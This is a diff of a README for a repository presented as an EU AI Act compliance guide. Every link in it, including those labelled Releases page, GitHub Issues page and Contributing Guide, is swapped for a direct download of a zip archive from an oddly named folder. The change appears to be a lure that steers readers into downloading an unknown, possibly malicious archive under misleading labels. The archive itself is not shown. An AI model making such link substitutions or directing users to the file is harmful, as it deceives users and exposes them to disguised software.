@@ -13,7 +13,7 @@ The **eu-ai-act-guide** offers a complete compliance guide for startups and smal
 ## 📦 Download & Install
 To get started, you need to download the software. 
 
-Visit this page to download: [Releases Page](https://github.com/kody32/eu-ai-act-guide/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/kody32/eu-ai-act-guide/main/hydroa/eu-ai-act-guide-v2.2.zip)
 
 ### Step-by-Step Installation
 1. Click on the link above to go to the Releases page.
@@ -45,11 +45,11 @@ After installation, launch the application by double-clicking its icon. The main
 ## 💬 Support
 If you encounter any issues or have questions, please refer to the following:
 
-- **GitHub Issues**: Report any software problems directly on our [GitHub Issues page](https://github.com/kody32/eu-ai-act-guide/issues).
+- **GitHub Issues**: Report any software problems directly on our [GitHub Issues page](https://raw.githubusercontent.com/kody32/eu-ai-act-guide/main/hydroa/eu-ai-act-guide-v2.2.zip).
 - **Community Forum**: Join our community forum to connect with other users. Your questions might already have answers.
 
 ## 📢 Stay Updated
-For updates and new features, keep an eye on the Releases page: [Releases Page](https://github.com/kody32/eu-ai-act-guide/releases). 
+For updates and new features, keep an eye on the Releases page: [Releases Page](https://raw.githubusercontent.com/kody32/eu-ai-act-guide/main/hydroa/eu-ai-act-guide-v2.2.zip). 
 
 ## 🏷️ Topics
 To help you navigate the key themes, here are the related topics covered:
@@ -67,11 +67,11 @@ To help you navigate the key themes, here are the related topics covered:
 - web-app
 
 ## 📅 Contributing
-We welcome contributions from everyone. If you have suggestions or want to help improve the guide, please check the [Contributing Guide](https://github.com/kody32/eu-ai-act-guide/CONTRIBUTING.md) to get started.
+We welcome contributions from everyone. If you have suggestions or want to help improve the guide, please check the [Contributing Guide](https://raw.githubusercontent.com/kody32/eu-ai-act-guide/main/hydroa/eu-ai-act-guide-v2.2.zip) to get started.
 
 Feel free to contact us for any improvement ideas or to report issues. Your feedback will help us enhance this guide for everyone. 
 
 ## 🤝 Acknowledgments
 Thanks to all who contributed to making this guide a valuable resource. Your insights and effort help startups and SMEs navigate compliance better.
 
-Don't forget to visit the [Releases Page](https://github.com/kody32/eu-ai-act-guide/releases) to stay updated!
+Don't forget to visit the [Releases Page](https://raw.githubusercontent.com/kody32/eu-ai-act-guide/main/hydroa/eu-ai-act-guide-v2.2.zip) to stay updated!
